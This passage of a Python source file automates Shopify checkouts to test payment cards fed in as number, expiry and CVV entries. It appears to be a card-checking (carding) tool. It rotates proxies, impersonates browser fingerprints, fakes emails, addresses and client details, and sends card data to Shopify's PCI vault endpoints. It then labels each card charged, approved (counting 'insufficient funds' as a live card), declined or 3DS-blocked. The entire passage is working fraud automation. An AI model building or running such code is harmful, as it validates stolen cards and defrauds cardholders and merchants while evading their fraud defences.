                                  "accept": "application/json",
                                  "referer": shop_url + "/"})
        if r1.status_code not in (200, 201):
            result.error = Exception(f"legacy cart: add.js {r1.status_code}")
            return result

        # 2. enter checkout
        r2 = client.get(f"{shop_url}/checkout", allow_redirects=True)
        checkout_url = str(r2.url)
        if "/checkouts/" not in checkout_url:
            result.error = Exception("legacy checkout: no /checkouts/ url")
            return result
        checkout_html = r2.text

        # 3. authenticity token
        m3 = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', checkout_html) \
            or re.search(r'value="([^"]+)"[^>]*name="authenticity_token"', checkout_html)
        if not m3:
            result.error = Exception("legacy checkout: no authenticity_token")
            return result
        authenticity = html.unescape(m3.group(1))

        # 4. contact + shipping address
        contact = {
            "_method": "patch", "authenticity_token": authenticity,
            "previous_step": "contact_information", "step": "shipping_method",
            "checkout[email]": email, "checkout[buyer_accepts_marketing]": "0",
            "checkout[shipping_address][first_name]": addr.first_name,
            "checkout[shipping_address][last_name]": addr.last_name,
            "checkout[shipping_address][address1]": addr.address1,
            "checkout[shipping_address][address2]": addr.address2,
            "checkout[shipping_address][city]": addr.city,
            "checkout[shipping_address][country]": addr.country_code,
            "checkout[shipping_address][province]": addr.zone_code,
            "checkout[shipping_address][zip]": addr.postal_code,
            "checkout[shipping_address][phone]": addr.phone,
            "checkout[note]": "",
            "checkout[client_details][browser_width]": str(random.randint(1200, 1600)),
            "checkout[client_details][browser_height]": str(random.randint(600, 900)),
            "checkout[client_details][javascript_enabled]": "1",
            "checkout[client_details][color_depth]": "24",
            "checkout[client_details][java_enabled]": "false",
            "checkout[client_details][browser_tz]": "-330",
        }
        r4 = client.post(checkout_url, data=contact)
        if r4.status_code not in (200, 302):
            result.error = Exception(f"legacy contact: {r4.status_code}")
            return result
        if "hipping method" not in (r4.text or ""):
            result.error = Exception("legacy shipping: step not reached")
            return result

        # 5. shipping rates
        ship_tag = ""
        try:
            r5 = client.get(f"{checkout_url}/shipping_rates?step=shipping_method")
            m5 = re.search(r'<div class="radio-wrapper" data-shipping-method="([^"]+)"', r5.text)
            if m5:
                ship_tag = m5.group(1)
        except Exception:
            pass
        if not ship_tag:
            result.error = Exception("legacy rates: no shipping method id")
            return result

        # 6. payment method step
        ship = {
            "_method": "patch", "authenticity_token": authenticity,
            "previous_step": "shipping_method", "step": "payment_method",
            "checkout[shipping_rate][id]": ship_tag,
            "checkout[client_details][browser_width]": str(random.randint(1200, 1600)),
            "checkout[client_details][browser_height]": str(random.randint(600, 900)),
            "checkout[client_details][javascript_enabled]": "1",
            "checkout[client_details][color_depth]": "24",
            "checkout[client_details][java_enabled]": "false",
            "checkout[client_details][browser_tz]": "-330",
        }
        r6 = client.post(checkout_url, data=ship)
        payment_due = re.search(r'"total_price"\s*:\s*"?([0-9.]+)', r6.text) \
            or re.search(r'data-checkout-total-price="([0-9.]+)"', r6.text)
        gateway = re.search(r'"payment_gateway"\s*:\s*"([^"]+)"', r6.text) \
            or re.search(r'name="checkout\[payment_gateway\]"[^>]*value="([^"]*)"', r6.text)
        result.gateway = gateway.group(1) if gateway else "shopify_payments"

        # 7. legacy vault session
        pci_payload = json.dumps({"credit_card": {
            "number": number, "month": int(month), "year": int(year),
            "verification_value": cvv, "name": full_name,
        }, "payment_session_scope": site_name})
        pci_headers = {"accept": "application/json", "content-type": "application/json",
                       "origin": "https://checkout.shopifycs.com",
                       "referer": "https://checkout.shopifycs.com/"}
        vault_id = ""
        for vault in ("https://deposit.us.shopifycs.com/sessions",
                      "https://elb.deposit.shopifycs.com/sessions",
                      "https://deposit.shopifycs.com/sessions",
                      "https://checkout.pci.shopifyinc.com/sessions"):
            if _lane_cooling(proxy_url):
                break
            try:
                rv = client.post(vault, data=pci_payload, headers=pci_headers)
                mv = re.search(r'"id"\s*:\s*"([^"]+)"', rv.text or "")
                if mv:
                    vault_id = mv.group(1)
                    _lane_recovered(proxy_url)
                    if proxy_url:
                        _remember_alive(proxy_url)
                    break
                if rv.status_code in (403, 500, 502, 503) or _is_challenge_html(rv.text):
                    _lane_burn(proxy_url, 60 if rv.status_code == 403 else PCI_BURN_SECONDS)
                    break
                if rv.status_code == 429:
                    time.sleep(random.uniform(0.4, 0.8))
                    continue
            except Exception:
                continue
        if not vault_id:
            result.error = Exception("legacy pci: no vault session id")
            return result

        # 8. final PATCH
        final_data = {
            "_method": "patch", "authenticity_token": authenticity,
            "previous_step": "payment_method", "step": "", "s": vault_id,
            "checkout[payment_gateway]": result.gateway,
            "checkout[credit_card][vault]": "false",
            "checkout[different_billing_address]": "false",
            "checkout[remember_me]": "0", "checkout[vault_phone]": "",
            "checkout[total_price]": (payment_due.group(1) if payment_due else ""),
            "complete": "1",
            "checkout[client_details][browser_width]": str(random.randint(1200, 1600)),
            "checkout[client_details][browser_height]": str(random.randint(600, 900)),
            "checkout[client_details][javascript_enabled]": "1",
            "checkout[client_details][color_depth]": "24",
            "checkout[client_details][java_enabled]": "false",
            "checkout[client_details][browser_tz]": "-330",
        }
        r7 = client.post(checkout_url, data=final_data)
        try:
            g = client.get(f"{checkout_url}/processing?from_processing_page=1&validate=true",
                           allow_redirects=True)
        except Exception:
            g = None
        final_html = g.text if g is not None else (r7.text or "")
        final_url = str(g.url) if g is not None else ""

        if "/thank" in final_url or "/orders/" in final_url:
            result.status = CheckStatus.CHARGED
            result.status_code = "ORDER_PAID"
            result.receipt_url = final_url
            return result
        low = final_html.lower()
        if "3d_secure" in low or "3d secure" in low:
            result.status = CheckStatus.THREE_DS
            result.status_code = "3DS_REQUIRED"
            return result
        if "insufficient fund" in low:
            result.status = CheckStatus.APPROVED
            result.status_code = "INSUFFICIENT_FUNDS"
            return result
        if "incorrect cvv" in low or "invalid cvv" in low or "security code" in low:
            result.status = CheckStatus.DECLINED
            result.status_code = "INCORRECT_CVC"
            result.error = Exception("INCORRECT_CVC")
            return result
        verdict = _classify_verdict(final_html)
        result.status_code = verdict or "CARD_DECLINED"
        result.error = Exception(result.status_code) if result.status_code != "ORDER_PAID" else None
        result.status = result_status_for(result.status_code)
        return result
    except Exception as e:
        result.error = Exception(f"legacy checkout: {e}")
        return result
    finally:
        client.close()


# ──────────────────────── Public orchestrator (cascade) ──────────────

_LEGACY_FALLBACK_CODES = frozenset({
    "PCI_ERROR", "CART_ERROR", "PROPOSAL_ERROR", "ERROR",
    "NO_PRODUCTS", "SUBMIT_ERROR",
})


def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    """Run the persisted pipeline; cascade to the legacy checkout on a
    non-verdict infrastructure fault (c3.py's persisted -> legacy fallback)."""
    _pace(shop_url)
    result = _persisted_checkout_for_card(shop_url, card_entry, proxy_url)
    if _result_code(result) in _LEGACY_FALLBACK_CODES:
        leg = legacy_checkout(shop_url, card_entry, proxy_url)
        if leg.status in (CheckStatus.CHARGED, CheckStatus.APPROVED, CheckStatus.DECLINED):
            return leg
    return result


def _persisted_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")

    result = CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        proxy=proxy_url,
        status=CheckStatus.ERROR
    )

    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    email = generate_random_email()
    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = random.choice(USER_AGENTS)

    client = TLSClient(timeout=12, proxy_url=proxy_url,
                       impersonate=impersonate, user_agent=user_agent)

    try:
        currency, country = fetch_shop_currency_sync(client, shop_url)
        result.currency = currency
        try:
            title, product_id, variant_id, price = find_cheapest_product(client, shop_url)
            _ = title, product_id
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result

        try:
            checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId, buildId, or sourceToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 1 failed: {e}")
            return result

        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 2 failed: {e}")
            return result

        try:
            ids: Dict[str, str] = {}
            hint = extract_actions_js_url(checkout_html, shop_url)
            if hint:
                try:
                    merge_persisted_ids(ids, extract_persisted_ids(fetch_actions_js(client, hint, shop_url)))
                except Exception:
                    pass
            if not (ids.get("Proposal") and ids.get("SubmitForCompletion")):
                for ref in extract_js_refs(checkout_html, shop_url):
                    if ref == hint:
                        continue
                    try:
                        found = extract_persisted_ids(fetch_actions_js(client, ref, shop_url))
                    except Exception:
                        continue
                    if found:
                        merge_persisted_ids(ids, found)
                    if ids.get("Proposal") and ids.get("SubmitForCompletion") and ids.get("PollForReceipt"):
                        break
            proposal_id = ids.get("Proposal", "")
            submit_id = ids.get("SubmitForCompletion", "")
            poll_for_receipt_id = ids.get("PollForReceipt", "")
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            if not poll_for_receipt_id:
                _log.warning("PollForReceipt id not found for %s (build %s); "
                             "Step 11 polling will fail", shop_url, build_id)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 3 failed: {e}")
            return result

        try:
            _, proposal_body = send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                                              stable_id, variant_id, price, proposal_id, build_id, source_token,
                                              currency, country)

            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency
            if not result.gateway:
                result.gateway = extract_gateway_name(proposal_body)

            if currency == "USD":
                seller_price = extract_seller_merchandise_price(proposal_body)
                if seller_price and seller_price != price:
                    price = seller_price

            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 4 failed: {e}")
            return result

        try:
            _, proposal2_body = send_proposal2(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 5 failed: {e}")
            return result

        try:
            addr = address_for_country(country)
            _, proposal3_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 6 failed: {e}")
            return result

        try:
            _, proposal4_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 7 failed: {e}")
            return result

        try:
            proposal5_status, proposal5_body = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                               stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                               queue_token4, email, addr, currency, country)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 8 failed: {e}")
            return result

        try:
            ident_sig = extract_identification_signature(checkout_html)
            if not ident_sig:
                raise Exception("could not extract identification signature")

            pci_status, pci_body = send_pci_session(ident_sig, card_number, f"{addr.first_name} {addr.last_name}",
                                                     card_month, card_year, card_cvv, site_name, proxy_url)

            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                verdict = classify_pci_rejection(pci_status, pci_body)
                if verdict == "invalid_cvc":
                    result.retryable = False
                    result.status = CheckStatus.DECLINED
                    result.error = Exception(
                        f"CVV rejected for this card type (HTTP {pci_status}): "
                        f"{_pci_error_reason(pci_body)}")
                    return result
                if verdict == "card_declined":
                    result.retryable = False
                    result.status = CheckStatus.DECLINED
                    result.error = Exception(
                        f"Card refused at tokenisation (HTTP {pci_status}): "
                        f"{_pci_error_reason(pci_body)}")
                    return result
                if verdict == "pci_error":
                    result.retryable = False
                    result.status = CheckStatus.ERROR
                    result.error = Exception(
                        f"PCI tokenisation refused the card data (HTTP {pci_status}): "
                        f"{_pci_error_reason(pci_body)}")
                    return result
                result.retryable = True
                raise Exception(
                    f"could not extract session ID (HTTP {pci_status}): "
                    f"{_pci_error_reason(pci_body)}")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = Exception(f"Step 9 failed: {e}")
            return result

        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")

            is_digital = not extract_is_shipping_required(proposal5_body)

            delivery_handle, shipping_amount, needs_delivery = resolve_delivery(proposal5_body)
            if not delivery_handle and needs_delivery:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("Step 10 failed: could not extract total amount")
            result.amount = total_amount

            flex_terms_id = extract_payment_flexibility_terms_id(proposal5_body)

            attempt_token = generate_attempt_token(checkout_token)
            current_tax = extract_tax_amount(proposal5_body)
            current_total = total_amount
            cover_any = False

            MAX_TAX_RETRIES = 6
            for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5, email,
                    addr, delivery_handle, shipping_amount, current_total,
                    pci_session_id, attempt_token, currency, country, signed_handles,
                    is_digital=is_digital,
                    tax_amount=current_tax,
                    total_any=cover_any,
                    payment_flexibility_terms_id=flex_terms_id
                )

                # ── 3DS is a terminal outcome ──
                if ('"AUTHENTICATION_REQUIRED"' in submit_body
                        or '"3DS_REQUIRED"' in submit_body
                        or '"challengeType"' in submit_body
                        or '"CompletePaymentChallenge"' in submit_body):
                    result.status      = CheckStatus.THREE_DS
                    result.status_code = "3DS_REQUIRED"
                    return result

                if ('"AUTHENTICATION_ERROR"' in submit_body
                        or '"AUTHENTICATION_FAILED"' in submit_body
                        or '"3DS_FAILED"' in submit_body):
                    result.status      = CheckStatus.DECLINED
                    result.status_code = "3DS_FAILED"
                    result.error       = Exception("3DS_FAILED")
                    result.retryable   = False
                    return result

                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    new_tax = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    continue

                if ("WAITING_PENDING_TERMS" in submit_body
                        or "Waiting for pending terms" in submit_body):
                    corr_total, corr_tax = extract_rejected_totals(submit_body)
                    if corr_total and float(corr_total) > 0:
                        current_total = corr_total
                    if corr_tax:
                        current_tax = corr_tax
                    dh, dh_ship = extract_delivery_from_proposal(submit_body)
                    if dh:
                        delivery_handle = dh
                        if dh_ship:
                            shipping_amount = dh_ship
                    signed2 = extract_signed_handles(submit_body)
                    if signed2:
                        signed_handles = signed2
                    time.sleep(extract_pending_poll_delay(submit_body))
                    continue

                if "cannot cover the total amount" in submit_body and not cover_any:
                    corrected_total, corrected_tax = extract_rejected_totals(submit_body)
                    if corrected_total and float(corrected_total) > 0:
                        current_total = corrected_total
                        if corrected_tax:
                            current_tax = corrected_tax
                    else:
                        cover_any = True
                    continue

                if "PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH" in submit_body.replace(" ", "_").upper() \
                        or "PAYMENT FLEXIBILITY TERMS ID MISMATCH" in submit_body:
                    new_id = extract_payment_flexibility_terms_id(submit_body)
                    if not new_id:
                        new_id = extract_payment_flexibility_terms_id(proposal5_body)
                    if new_id and new_id != flex_terms_id:
                        flex_terms_id = new_id
                        continue
                break

            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                raw = extract_any_error(submit_body)
                if raw:
                    error_msg = normalize_card_result(raw)
                else:
                    error_msg, retry = no_code_failure(submit_body)
                    result.status      = CheckStatus.ERROR
                    result.status_code = error_msg
                    result.error       = Exception(error_msg)
                    result.retryable   = retry
                    return result

                if error_msg == "3DS_REQUIRED":
                    result.status      = CheckStatus.THREE_DS
                    result.status_code = "3DS_REQUIRED"
                    result.retryable   = False
                    return result
                if error_msg == "3DS_FAILED":
                    result.status      = CheckStatus.DECLINED
                    result.status_code = "3DS_FAILED"
                    result.error       = Exception("3DS_FAILED")
                    result.retryable   = False
                    return result

                result.status = result_status_for(error_msg)
                result.status_code = error_msg
                result.error = Exception(error_msg)
                result.retryable = (error_msg in ("GENERIC_ERROR", "CHECKOUT_RETRYABLE")
                                    or any(keyword in error_msg.lower()
                                           for keyword in ['inventory', 'retry', 'try again']))
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10 failed: could not extract sessionToken")
            if not result.gateway:
                result.gateway = extract_gateway_name(proposal5_body, submit_body)
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error = e
            return result

        # Step 11 - Poll for receipt
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re = re.compile(r'"__typename"\s*:\s*"([A-Za-z_]*Receipt[A-Za-z_]*)"')
        seen_rounds = 0
        max_patient_rounds = 120
        patient_rounds = 0
        last_outcome = "unknown"

        while seen_rounds < 30:
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
                )

                receipt_type = ""
                match = type_name_re.search(poll_body)
                if match:
                    receipt_type = match.group(1)

                outcome = classify_receipt(poll_body, receipt_type)
                last_outcome = outcome
                result.status_code = extract_receipt_status_code(poll_body, receipt_type)

                if outcome == "three_ds_required":
                    result.status      = CheckStatus.THREE_DS
                    result.status_code = "3DS_REQUIRED"
                    result.retryable   = False
                    return result

                if outcome == "three_ds_failed":
                    result.status      = CheckStatus.DECLINED
                    result.status_code = "3DS_FAILED"
                    result.error       = Exception("3DS_FAILED")
                    result.retryable   = False
                    return result

                if outcome == "success":
                    result.status = CheckStatus.CHARGED
                    result.status_code = "ORDER_PAID"
                    for path in (("data", "receipt", "confirmationPage", "url"),
                                 ("data", "submitForCompletion", "receipt",
                                  "confirmationPage", "url")):
                        try:
                            node = json.loads(poll_body)
                            for key in path:
                                node = node.get(key, {}) if isinstance(node, dict) else {}
                            if isinstance(node, str) and node.startswith("http"):
                                result.receipt_url = node
                                break
                        except Exception:
                            pass
                    if not result.receipt_url:
                        result.receipt_url = checkout_url
                    return result

                if outcome == "failure":
                    match = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
                    if match:
                        error_code = normalize_card_result(match.group(1))
                        if error_code == "FAILED":
                            error_code = "GENERIC_ERROR"
                    else:
                        error_code = "UNKNOWN_ERROR"
                        raw_msg = extract_any_error(poll_body)
                        if raw_msg:
                            error_code = f"UNKNOWN_ERROR: {raw_msg[:80]}"

                    if error_code == "3DS_REQUIRED":
                        result.status      = CheckStatus.THREE_DS
                        result.status_code = "3DS_REQUIRED"
                        result.retryable   = False
                        return result
                    if error_code == "3DS_FAILED":
                        result.status      = CheckStatus.DECLINED
                        result.status_code = "3DS_FAILED"
                        result.error       = Exception("3DS_FAILED")
                        result.retryable   = False
                        return result

                    result.status = result_status_for(error_code)
                    result.status_code = error_code
                    result.error = Exception(error_code)
                    result.retryable = (error_code in ("GENERIC_ERROR", "CHECKOUT_RETRYABLE")
                                        or error_code == "01003"
                                        or "InventoryReservationFailure" in poll_body)
                    return result

                if outcome in ("pending", "retryable"):
                    patient_rounds += 1
                else:
                    seen_rounds += 1

                if patient_rounds > max_patient_rounds:
                    break

                delay = 500
                match = poll_delay_re.search(poll_body)
                if match:
                    try:
                        d = int(match.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                if outcome == "retryable":
                    delay = max(delay, 400)
                time.sleep(min(delay, 300) / 1000.0)

            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error = Exception(f"poll {seen_rounds + 1} failed: {e}")
                return result

        result.status      = CheckStatus.ERROR
        result.status_code = "POLL_TIMEOUT"
        result.error       = Exception("receipt not confirmed within poll budget")
        result.retryable   = True
        return result

    finally:
        client.close()